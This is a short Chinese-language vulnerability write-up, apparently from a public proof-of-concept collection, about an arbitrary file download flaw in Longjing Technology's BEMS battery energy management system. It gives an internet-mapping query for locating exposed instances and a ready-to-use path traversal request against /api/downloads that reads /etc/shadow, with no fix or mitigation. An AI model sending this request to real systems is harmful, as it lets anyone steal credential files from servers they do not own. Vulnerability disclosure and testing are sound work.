# 龙璟科技 电池能量BEMS downloads 任意文件下载漏洞

## 漏洞描述

龙璟科技 电池能量BEMS 存在接口可任意文件下载获取服务器任意文件信息

## 漏洞影响

```
龙璟科技 电池能量BEMS
```

## 网络测绘

```
title=电池能量管理系统 BEMS
```

## 漏洞复现

登陆页面

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326120120278.png)

验证POC

```plain
/api/downloads?fileName=../../../../../../../../etc/shadow
```

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326120120279.png)